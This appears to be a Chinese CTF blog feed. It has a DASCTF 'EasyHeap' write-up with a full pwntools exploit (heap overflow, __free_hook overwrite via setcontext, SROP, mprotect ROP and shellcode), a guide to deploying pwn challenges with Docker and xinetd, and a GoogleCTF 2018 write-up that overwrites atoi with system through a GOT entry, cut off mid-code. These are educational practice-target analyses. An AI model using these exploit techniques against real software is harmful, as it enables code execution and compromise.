        <content type="html"><![CDATA[<h1 id="DASCTF-July-EasyHeap"><a href="#DASCTF-July-EasyHeap" class="headerlink" title="DASCTF July - EasyHeap"></a>DASCTF July - EasyHeap</h1><p>果然名字里又有ez的题目都不简单。。。。</p><span id="more"></span><h1 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00 分析"></a>0x00 分析</h1><p>开启了沙箱保护，一开始没注意到，还以为是哪出问题了（</p><p><img src="https://pic.imgdb.cn/item/6106a75c5132923bf8305a2b.jpg"></p><p>主要逻辑就是简单的菜单，然后有edit的堆溢出</p><p><img src="https://pic.imgdb.cn/item/6106a7935132923bf83151bf.jpg"></p><h1 id="0x01-解题思路"><a href="#0x01-解题思路" class="headerlink" title="0x01 解题思路"></a>0x01 解题思路</h1><p>开启了沙箱只能用orw的shellcode，但是没开NX而且是堆溢出，考虑使用SROP技术，而且是又是在堆上，再考虑setcontext利用技术</p><p>(下次再写一篇blog总结下setcontext技术)</p><p>libc里的setcontext段</p><p><img src="https://pic.imgdb.cn/item/6106a8605132923bf834d9bd.jpg"></p><p>所以这题的主要逻辑就是：</p><ol><li><p>把freehook写成setcontext+53</p></li><li><p>然后一个堆块放frame</p></li><li><p>delete这个堆</p></li><li><p>后面再执行mprotect，然后返回shellcodeorw</p></li></ol><p>最后我调了半天寄存器都不太合适，还好大佬同学ayoung给力出了这玩意~</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment">#r = process('./Easyheap')</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26275</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Easyheap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment">#libc = ELF('./libc-2.27.so')</span>cmd1 <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>cmd2 <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>cmd1<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>cmd1<span class="token punctuation">(</span>size<span class="token punctuation">)</span>cmd2<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>cmd1<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>cmd1<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>cmd1<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>cmd1<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>cmd1<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>cmd1<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>cmd2<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token comment">#for i in range(10):</span><span class="token comment">#add(0x100, 'a'*0x100)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x500</span><span class="token punctuation">)</span> <span class="token comment">#1</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#2</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#3</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#4</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span> <span class="token comment">#5</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> data<span class="token operator">-</span><span class="token number">0x3ebca0</span><span class="token keyword">print</span> <span class="token string">'libc_base ===> '</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x511</span><span class="token punctuation">)</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>set_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span>syscall <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'syscall'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">23</span><span class="token comment"># frame 的构造，我自己的exp好像就是这块不太合适（</span>fake_rsp <span class="token operator">=</span> free_hook<span class="token operator">&amp;</span><span class="token number">0xfffffffffffff000</span>frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rax<span class="token operator">=</span><span class="token number">0</span>frame<span class="token punctuation">.</span>rdi<span class="token operator">=</span><span class="token number">0</span>frame<span class="token punctuation">.</span>rsi<span class="token operator">=</span>fake_rspframe<span class="token punctuation">.</span>rdx<span class="token operator">=</span><span class="token number">0x2000</span>frame<span class="token punctuation">.</span>rsp<span class="token operator">=</span>fake_rspframe<span class="token punctuation">.</span>rip<span class="token operator">=</span>syscalldelete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment">#3</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x500</span><span class="token punctuation">)</span> <span class="token comment">#unsorted bin 6</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>set_addr<span class="token operator">+</span><span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment">#7</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">#7</span><span class="token comment">#gdb.attach(r)</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>prdi_ret <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdi\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>prsi_ret <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rsi\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>prdx_ret <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rdx\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>prax_ret <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"pop rax\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>jmp_rsp <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"jmp rsp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>mprotect_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>prdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_rsp<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>prsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>prdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>prax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span> <span class="token comment">#mprotect(fake_rsp,0x1000,7)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>fake_rsp<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>fake_rsp<span class="token operator">+</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-题目docker搭建</title>
      <link href="//post/pwn-%E9%A2%98%E7%9B%AEdocker%E6%90%AD%E5%BB%BA.html"/>
      <url>//post/pwn-%E9%A2%98%E7%9B%AEdocker%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<h1 id="题目docker搭建"><a href="#题目docker搭建" class="headerlink" title="题目docker搭建"></a>题目docker搭建</h1><p>最近在研究pwn出题，顺便研究下docker</p><span id="more"></span><h2 id="本地搭建"><a href="#本地搭建" class="headerlink" title="本地搭建"></a>本地搭建</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat tcp-l:6666,fork exec:./pwn,reuseaddr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$nc</span> <span class="token number">0.0</span>.0.0 <span class="token number">6666</span><span class="token function">ls</span>flagpwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>也可以加个nohup，还可以再加个&amp;</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> socat tcp-l:6666,fork exec:./pwn,reuseaddr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> socat tcp-l:6666,fork exec:./pwn,reuseaddr<span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>他们的作用分别是<br>使用&amp;后台运行程序：</p><ul><li>结果会输出到终端</li><li>使用Ctrl + C发送SIGINT信号，程序免疫</li><li>关闭session发送SIGHUP信号，程序关闭</li></ul><p>使用nohup运行程序：</p><ul><li>结果默认会输出到nohup.out</li><li>使用Ctrl + C发送SIGINT信号，程序关闭</li><li>关闭session发送SIGHUP信号，程序免疫</li></ul><h2 id="dockr搭建pwn题"><a href="#dockr搭建pwn题" class="headerlink" title="dockr搭建pwn题"></a>dockr搭建pwn题</h2><p>开源项目地址: <a href="https://github.com/Eadom/ctf_xinetd">https://github.com/Eadom/ctf_xinetd</a><br>克隆下来之后，在当前目录下执行如下命令</p><h3 id="建造镜像"><a href="#建造镜像" class="headerlink" title="建造镜像"></a>建造镜像</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build -t pwn-docker:16.04 <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若想搭建为18.04的环境，将dockerfile文件里面FROM ubuntu:16.04改为 FROM ubuntu:18.04</p><pre class="line-numbers language-ABAP" data-language="ABAP"><code class="language-ABAP">FROM ubuntu:16.04  #修改的地方RUN sed -i &quot;s&#x2F;http:\&#x2F;\&#x2F;archive.ubuntu.com&#x2F;http:\&#x2F;\&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;g&quot; &#x2F;etc&#x2F;apt&#x2F;sources.list &amp;&amp; \    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \    apt-get install -y lib32z1 xinetd &amp;&amp; apt-get install -y vimRUN useradd -m ctfWORKDIR &#x2F;home&#x2F;ctfRUN cp -R &#x2F;lib* &#x2F;home&#x2F;ctf &amp;&amp; \    cp -R &#x2F;usr&#x2F;lib* &#x2F;home&#x2F;ctfRUN mkdir &#x2F;home&#x2F;ctf&#x2F;dev &amp;&amp; \    mknod &#x2F;home&#x2F;ctf&#x2F;dev&#x2F;null c 1 3 &amp;&amp; \    mknod &#x2F;home&#x2F;ctf&#x2F;dev&#x2F;zero c 1 5 &amp;&amp; \    mknod &#x2F;home&#x2F;ctf&#x2F;dev&#x2F;random c 1 8 &amp;&amp; \    mknod &#x2F;home&#x2F;ctf&#x2F;dev&#x2F;urandom c 1 9 &amp;&amp; \    chmod 666 &#x2F;home&#x2F;ctf&#x2F;dev&#x2F;*RUN mkdir &#x2F;home&#x2F;ctf&#x2F;bin &amp;&amp; \    cp &#x2F;bin&#x2F;sh &#x2F;home&#x2F;ctf&#x2F;bin &amp;&amp; \    cp &#x2F;bin&#x2F;ls &#x2F;home&#x2F;ctf&#x2F;bin &amp;&amp; \    cp &#x2F;bin&#x2F;cat &#x2F;home&#x2F;ctf&#x2F;binCOPY .&#x2F;ctf.xinetd &#x2F;etc&#x2F;xinetd.d&#x2F;ctfCOPY .&#x2F;start.sh &#x2F;start.shRUN echo &quot;Blocked by ctf_xinetd&quot; &gt; &#x2F;etc&#x2F;banner_failRUN chmod +x &#x2F;start.shCOPY .&#x2F;bin&#x2F; &#x2F;home&#x2F;ctf&#x2F;RUN chown -R root:ctf &#x2F;home&#x2F;ctf &amp;&amp; \    chmod -R 750 &#x2F;home&#x2F;ctf &amp;&amp; \    chmod 740 &#x2F;home&#x2F;ctf&#x2F;flagCMD [&quot;&#x2F;start.sh&quot;]EXPOSE 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="然后创建容器，并做端口转发"><a href="#然后创建容器，并做端口转发" class="headerlink" title="然后创建容器，并做端口转发"></a>然后创建容器，并做端口转发</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run -p <span class="token number">0.0</span>.0.0:9997:9999 pwn-docker:16.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后在物理机上访问9997端口,测试成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$nc</span> <span class="token number">0.0</span>.0.0 <span class="token number">9997</span><span class="token function">ls</span>bindevflagliblib32lib64pwn<span class="token function">cat</span> flagctf<span class="token punctuation">&#123;</span>please_initialize_this_flag<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="更换题目"><a href="#更换题目" class="headerlink" title="更换题目"></a>更换题目</h3><p>可用docker cp命令替换/home/ctf目录下的helloworld，并修改/etc/xinetd.d/ctf里面的题目名称</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> ctf<span class="token punctuation">&#123;</span>    disable <span class="token operator">=</span> no    socket_type <span class="token operator">=</span> stream    protocol    <span class="token operator">=</span> tcp    <span class="token function">wait</span>        <span class="token operator">=</span> no    user        <span class="token operator">=</span> root    <span class="token builtin class-name">type</span>        <span class="token operator">=</span> UNLISTED    port        <span class="token operator">=</span> <span class="token number">9999</span>    <span class="token builtin class-name">bind</span>        <span class="token operator">=</span> <span class="token number">0.0</span>.0.0    server      <span class="token operator">=</span> /usr/sbin/chroot    <span class="token comment"># replace helloworld to your program</span>    server_args <span class="token operator">=</span> --userspec<span class="token operator">=</span><span class="token number">1000</span>:1000 /home/ctf ./helloworld  <span class="token comment">#修改的地方</span>    banner_fail <span class="token operator">=</span> /etc/banner_fail    <span class="token comment"># safety options</span>    per_source<span class="token operator">=</span> <span class="token number">10</span> <span class="token comment"># the maximum instances of this service per source IP address</span>    rlimit_cpu<span class="token operator">=</span> <span class="token number">20</span> <span class="token comment"># the maximum number of CPU seconds that the service may use</span>    <span class="token comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span>    <span class="token comment">#access_times = 2:00-9:00 12:00-24:00</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="同时搭建多题"><a href="#同时搭建多题" class="headerlink" title="同时搭建多题"></a>同时搭建多题</h2><p>开源项目地址： <a href="https://github.com/giantbranch/pwn_deploy_chroot">https://github.com/giantbranch/pwn_deploy_chroot</a></p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装docker</span><span class="token function">curl</span> -s https://get.docker.com/ <span class="token operator">|</span> <span class="token function">sh</span>  <span class="token comment">#已安装过的跳过</span><span class="token comment"># 安装 docker compose 和git</span><span class="token function">apt</span> <span class="token function">install</span> <span class="token function">docker-compose</span> <span class="token function">git</span><span class="token comment"># 下载</span><span class="token function">git</span> clone https://github.com/giantbranch/pwn_deploy_chroot.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>克隆下来之后，只需三步就可以搭建多道pwn题，并自动生成flag，获取到shell自动cat flag</p><ul><li>将所有pwn题目放入bin目录（注意名字不带特殊字符，因为会将文件名作为linux用户名）</li><li>python initialize.py</li><li>docker-compose up –build -d</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$python</span> initialize.py <span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token builtin class-name">:</span> <span class="token string">"flag&#123;9c900d02-8567-4e16-8952-47a92d2dc06a&#125;"</span>, <span class="token string">"port"</span><span class="token builtin class-name">:</span> <span class="token number">10000</span>, <span class="token string">"filename"</span><span class="token builtin class-name">:</span> <span class="token string">"pwn1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token builtin class-name">:</span> <span class="token string">"flag&#123;6f785f9e-fb19-4b54-9c6c-dd9b6f62041a&#125;"</span>, <span class="token string">"port"</span><span class="token builtin class-name">:</span> <span class="token number">10001</span>, <span class="token string">"filename"</span><span class="token builtin class-name">:</span> <span class="token string">"pwn1_copy1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token string">"flag"</span><span class="token builtin class-name">:</span> <span class="token string">"flag&#123;c65a3be4-a9d1-4122-b981-7a241ca73027&#125;"</span>, <span class="token string">"port"</span><span class="token builtin class-name">:</span> <span class="token number">10002</span>, <span class="token string">"filename"</span><span class="token builtin class-name">:</span> <span class="token string">"pwn1_copy2"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker-compose</span> up --build -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$nc</span> <span class="token number">0.0</span>.0.0 <span class="token number">10000</span>pwn <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="更换题目-1"><a href="#更换题目-1" class="headerlink" title="更换题目"></a>更换题目</h3><p>先把开启的容器删除掉，再执行上面三步即可。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-GoogleCTF-2018-ToDo</title>
      <link href="//post/pwn-GoogleCTF-2018-ToDo.html"/>
      <url>//post/pwn-GoogleCTF-2018-ToDo.html</url>
      
        <content type="html"><![CDATA[<h1 id="GoogleCTF-2018-Fridge-ToDo-List"><a href="#GoogleCTF-2018-Fridge-ToDo-List" class="headerlink" title="GoogleCTF-2018 Fridge ToDo List"></a>GoogleCTF-2018 Fridge ToDo List</h1><p>开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。</p><span id="more"></span><ol><li>打印列表</li><li>打印ToDo的任务</li><li>存储ToDo任务</li><li>删除ToDo任务</li><li>远程管理员</li><li>退出</li></ol><p>首先第一个选项，就仅仅是打印，没什么输入，放弃。</p><p>第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。</p><p>第五个查看源码就知道只是一个幌子。</p><p>第六个没啥好说的，退出操作。</p><p>看到第二个和第三个操作中都有同样的代码</p><p><a href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png"><img src="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/19.png" alt="img"></a></p><p>这里只检查了是否大于最大数量，并没有限制是否小于0,。所以我们可以越界读和写。</p><p>通过IDA我们分析看到 todo从0x203140开始，间隔为0x30，那么往上面看看有什么可以读写的。</p><p><a href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png"><img src="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/20.png" alt="img"></a></p><p>不错，在.got.plt部分，我们可以读取到这三个函数的地址，泄露了函数地址，意味着我们可以得到libc的信息。</p><p>这里我们看到atoi是每次我们输入编号都会调用的函数，atoi而且还在open的附近，那么我们可以把atoi覆盖成system执行我们的任意命令，造成命令执行。所以剩下的就简单了，执行写操作，通过之前泄露的libc得到system的地址，覆盖atoi的地址。代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> unpack<span class="token punctuation">,</span>pack<span class="token comment"># r = remote("fridge-todo-list.ctfcompetition.com",1337)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./todo'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"mark\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"2\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">"read?"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"-6\n"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> r<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">"Hi mark,"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 